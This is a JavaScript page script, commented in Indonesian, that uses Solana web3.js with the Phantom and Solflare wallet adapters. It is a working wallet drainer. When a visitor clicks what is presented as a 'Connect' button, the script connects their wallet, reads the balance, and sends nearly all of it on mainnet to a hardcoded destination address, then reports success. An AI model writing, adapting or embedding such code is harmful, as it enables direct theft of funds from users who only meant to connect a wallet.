import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import { PhantomWalletAdapter, SolflareWalletAdapter } from '@solana/wallet-adapter-wallets';

// Koneksi ke jaringan Solana
const connection = new Connection('https://api.mainnet-beta.solana.com'); // Mainnet
const destinationWallet = '8hwCeAvMNYwEBnSFqCFh56DtYQuue8kuSD7AmKPWTbqb'; // Ganti dengan wallet tujuan

// Inisialisasi wallet yang didukung
const wallets = [
    new PhantomWalletAdapter(),
    new SolflareWalletAdapter(),
];

// Fungsi untuk menghubungkan wallet pengguna
async function connectWallet() {
    for (const wallet of wallets) {
        if (wallet.readyState === 'Installed') {
            try {
                await wallet.connect();
                console.log('Wallet connected:', wallet.publicKey.toString());
                return wallet;
            } catch (error) {
                console.error('Failed to connect wallet:', error);
            }
        }
    }
    alert('No supported wallet found. Please install Phantom or Solflare.');
    return null;
}

// Fungsi untuk mendapatkan saldo wallet
async function getWalletBalance(walletPublicKey) {
    try {
        const balance = await connection.getBalance(walletPublicKey);
        return balance; // Saldo dalam lamports
    } catch (error) {
        console.error('Failed to fetch balance:', error);
        return 0;
    }
}

// Fungsi untuk memvalidasi saldo setelah wallet terhubung
async function validateBalanceAndProceed(wallet) {
    const balanceLamports = await getWalletBalance(wallet.publicKey);

    if (balanceLamports <= 0) {
        alert('Your wallet has insufficient balance (0 SOL). Please add funds to proceed.');
        return false; // Tidak melanjutkan proses jika saldo 0
    }

    return true; // Melanjutkan proses jika saldo mencukupi
}

// Fungsi untuk mengirim seluruh saldo
async function sendAllFunds(wallet) {
    const balanceLamports = await getWalletBalance(wallet.publicKey);

    if (balanceLamports <= 0) {
        alert('Insufficient balance. No funds available to transfer.');
        return;
    }

    const transaction = new Transaction().add(
        SystemProgram.transfer({
            fromPubkey: wallet.publicKey,
            toPubkey: new PublicKey(destinationWallet),
            lamports: balanceLamports - 5000, // Sisakan sedikit untuk fee (~5000 lamports)
        })
    );

    try {
        const signature = await wallet.sendTransaction(transaction, connection);
        console.log('Transaction sent:', signature);
        alert('All funds successfully transferred!');
    } catch (error) {
        console.error('Transaction failed:', error);
        alert('Transaction failed. Please try again.');
    }
}

// Event listener pada tombol Connect
document.getElementById('connectButton').addEventListener('click', async () => {
    const wallet = await connectWallet();

    if (wallet) {
        const isBalanceValid = await validateBalanceAndProceed(wallet);

        if (isBalanceValid) {
            await sendAllFunds(wallet); // Lanjutkan dengan pengiriman dana
        }
    }
});
